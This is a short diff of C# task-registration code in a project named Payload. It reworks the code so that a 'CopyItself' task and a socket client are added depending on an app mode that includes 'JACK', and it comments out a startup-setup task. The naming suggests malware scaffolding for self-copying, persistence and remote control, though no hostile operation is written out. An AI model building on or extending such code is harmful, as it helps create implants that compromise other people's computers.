@@ -1,5 +1,6 @@
 ﻿using Payload.Command.Interface;
 using Payload.Command.SocketClient;
+using Payload.Common;
 using Payload.Core.Command;
 using System;
 using System.Collections.Generic;
@@ -51,10 +52,18 @@ namespace Payload.Command
             TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
             //TaskMap.Add(Common.Config.EnumTask.Demo, new DemorFactory().CreateTaskPack());
 
-            TaskMap.Add(Common.Config.EnumTask.StartupSetup, new StartupSetupFactory().CreateTaskPack());
-            TaskMap.Add(Common.Config.EnumTask.SocketIO, new SocketIOClientFactory().CreateTaskPack());
-
-            TaskMap.Add(Common.Config.EnumTask.CopyItself, new CopyItselfFactory().CreateTaskPack());
+            switch (Config.Instance.AppMode)
+            {
+                case EnumAppMode.DEBUG:
+                    goto case EnumAppMode.NONE;
+                case EnumAppMode.JACK:
+                    //TaskMap.Add(Common.Config.EnumTask.StartupSetup, new StartupSetupFactory().CreateTaskPack());
+                    TaskMap.Add(Common.Config.EnumTask.CopyItself, new CopyItselfFactory().CreateTaskPack());
+                    goto case EnumAppMode.NONE;
+                case EnumAppMode.NONE:
+                    TaskMap.Add(Common.Config.EnumTask.SocketIO, new SocketIOClientFactory().CreateTaskPack());
+                    break;
+            }
         }
 
         public bool AddTaskPack(Common.Config.EnumTask _key, TaskPack _tp)
@@ -130,7 +139,7 @@ namespace Payload.Command
                 {
                     new StartProcessCommand().Execute();
                     Environment.Exit(0);
-                }                
+                }
                 if (_tp.Mode.Equals(EnumTaskPackMode.NONE) || !_tp.ShouldCallRun)
                     continue;
                 if (_tp.Mode.Equals(EnumTaskPackMode.ONCE) && _tp.Executed)
